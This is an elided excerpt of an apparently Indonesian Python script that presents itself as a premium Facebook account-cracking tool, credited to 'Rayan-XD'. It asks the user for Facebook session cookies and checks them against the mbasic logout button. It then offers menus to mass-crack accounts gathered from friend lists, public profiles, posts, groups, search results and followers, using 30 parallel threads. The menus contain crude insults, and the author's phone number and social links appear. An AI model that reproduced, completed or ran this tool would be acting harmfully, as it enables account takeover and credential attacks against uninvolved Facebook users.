...
\033[1;92m--------------------------------------------------➤
\033[1;93m➣ Author   : [ Rayan-XD ]
\033[1;93m➣ GitHub : [ https://github.com/Rayan-XD ]
\033[1;93m➣ Whatsapp : [ 0858-5276-8706 ]
\033[1;92m➣ Facebook : [ https://www.facebook.com/luki.kece.79 ]
\033[1;93m➣ Status   : [ Premium ]
\033[1;92m--------------------------------------------------➤
  ''')
    print('' + Back.RED + Fore.BLACK + '        Creator : Rayan-XD         \033[00m')
    print()
...
def masuk():
    try:
          ...
          cek = input("cookies lern 👉      http://wa.me/+62858527687066gg👈👈  Akan di arahkan ke wa admin👈👈👉👉enter \033[00m Masukan Cookies : \033[1;96m")
    cek = {"cookie":cek}
    ...
    if "mbasic_logout_button" in str(ismi):
        ...
        time.sleep(1)
        os.system('python CrackPremium.py')
def nid():
...
def menu():
    ...
    nid()
    print('''
\033[93m1). \033[00mCrack Dari Daftar Teman
\033[93m2). \033[00mCrack Dari Akun Publik
\033[93m3). \033[00mCrack Dari Postingan
\033[93m4). \033[00mCrack Dari Grup
\033[93m5). \033[00mCrack Dari Pencarian
\033[93m6). \033[00mCrack Dari Followers
...
def pilih_menu():
    ...
    if ff == '1':
       ...
       try:
           ...
           print('\033[91mPengguna tidak ada\033[00m')
           sleep(1)
           menu()
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
       ...
       print('\n\033[00m[\033[96m*\033[00m]Selesai.')
         ...
         if 'www.facebook' in asw:
             ...
             print('\033[91mJangan di kosongin kontol!\033[00m')
             sleep(1)
             menu()
         username=like(asw)
         with ThreadPoolExecutor(max_workers=30) as ex:
         ...
         sys.exit('\033[1;97mSemoga Harimu Suram Kontol\n\033[91mexit\033[00m')
    else:
         print('\033[91mMasukin Yg Bener Kontol!\033[00m')
         sleep(1)
         menu()
